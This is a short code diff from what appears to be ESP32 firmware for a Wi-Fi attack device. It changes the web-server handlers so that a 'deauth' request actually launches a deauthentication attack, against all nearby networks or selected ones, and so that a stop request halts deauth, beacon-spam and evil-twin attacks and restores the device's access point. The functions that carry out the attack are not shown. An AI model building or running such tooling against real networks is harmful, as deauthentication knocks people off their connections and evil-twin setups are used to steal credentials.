@@ -285,11 +285,16 @@ void handleBLEScan() {
 void handleDeauth() {
     String mode = server.arg("mode");
     if (mode == "all") {
-        attackMode = DEAUTH_TYPE_ALL;
+        deauth_type = DEAUTH_TYPE_ALL;
         WiFi.softAPdisconnect();
         WiFi.mode(WIFI_MODE_STA);
+        start_deauth(0, DEAUTH_TYPE_ALL, 1);
     } else {
-        attackMode = DEAUTH_TYPE_SINGLE;
+        deauth_type = DEAUTH_TYPE_SINGLE;
+        String nets = server.arg("nets");
+        if (nets.length() > 0) {
+            start_deauth(0, DEAUTH_TYPE_SINGLE, 1);
+        }
     }
     server.send(200, "text/plain", "OK");
 }
@@ -298,7 +303,10 @@ void handleStop() {
     attackRunning = false;
     beaconRunning = false;
     evilTwinRunning = false;
+    deauth_type = DEAUTH_TYPE_SINGLE;
     stop_deauth();
+    WiFi.mode(WIFI_MODE_AP);
+    WiFi.softAP(AP_SSID, AP_PASS);
     server.send(200, "text/plain", "OK");
 }
 
